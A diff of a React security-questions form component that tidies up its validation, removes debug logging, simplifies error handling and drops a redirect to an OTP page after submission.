@@ -1,8 +1,8 @@
+// Frontend - SecurityQuestionsForm.js
 import React, { useState } from "react";
 import axios from "axios";
 import BASE_URL from "../components/urls";
 import logo from "../assets/logo.png";
-import { useNavigate } from "react-router-dom";
 
 const questionsList = [
   "What is your father's middle name?",
@@ -21,15 +21,13 @@ const questionsList = [
 ];
 
 const SecurityQuestionsForm = () => {
-  // Initialize form data with 3 questions
+  // Initialize with 3 security questions
   const [formData, setFormData] = useState([
     { question: "", answer: "" },
     { question: "", answer: "" },
     { question: "", answer: "" }
   ]);
   const [loading, setLoading] = useState(false);
-  const navigate = useNavigate();
-
   const handleChange = (index, field, value) => {
     const updated = [...formData];
     updated[index][field] = value;
@@ -38,65 +36,30 @@ const SecurityQuestionsForm = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    
+    // Validate all questions are selected and answered
+    const isValid = formData.every(item => item.question && item.answer.trim());
+    if (!isValid) {
+      alert("Please fill in all security questions and answers");
+      return;
+    }
+
     setLoading(true);
     
     try {
-      console.log("Current formData:", formData);
-      console.log("BASE_URL:", BASE_URL);
-      
-      // Simple validation - just check if all fields are filled
-      let allFilled = true;
-      for (let i = 0; i < formData.length; i++) {
-        if (!formData[i].question || !formData[i].answer.trim()) {
-          allFilled = false;
-          break;
-        }
-      }
-      
-      if (!allFilled) {
-        alert("Please fill in all security questions and answers");
-        setLoading(false);
-        return;
-      }
-      
-      console.log("Making API call...");
-      
-      const response = await axios.post(`${BASE_URL}/security`, {
+      await axios.post(`${BASE_URL}/security`, {
         questions: formData,
-      }, {
-        timeout: 10000, // 10 second timeout
-        headers: {
-          'Content-Type': 'application/json'
-        }
       });
-      
-      console.log("API Response:", response.data);
-      alert("Security questions submitted successfully!");
-      
-      // Reset form
+      // Reset form after successful submission
       setFormData([
         { question: "", answer: "" },
         { question: "", answer: "" },
         { question: "", answer: "" }
       ]);
-      
-      // Navigate to next page
-      navigate("/otp");
-      
+      alert("Security questions submitted successfully!");
     } catch (err) {
-      console.error("Full error object:", err);
-      console.error("Error response:", err.response);
-      
-      let errorMessage = "Submission failed! ";
-      if (err.response) {
-        errorMessage += `Server error: ${err.response.data}`;
-      } else if (err.request) {
-        errorMessage += "Network error - please check your connection";
-      } else {
-        errorMessage += err.message;
-      }
-      
-      alert(errorMessage);
+      console.error("Submission failed:", err);
+      alert("Submission failed!");
     } finally {
       setLoading(false);
     }
@@ -112,10 +75,9 @@ const SecurityQuestionsForm = () => {
           Set Security Questions
         </h2>
         <p className="text-sm text-gray-500 text-center mb-6">
-          Please select and answer three security questions. You'll need these
-          if you ever forget your password.
+          It is important you remember your secret questions.
+          You will need them if you ever forgot your password.
         </p>
-        
         <form onSubmit={handleSubmit} className="space-y-6">
           {formData.map((item, index) => (
             <div key={index} className="space-y-2">
@@ -161,7 +123,6 @@ const SecurityQuestionsForm = () => {
               />
             </div>
           ))}
-          
           <button
             type="submit"
             disabled={loading}
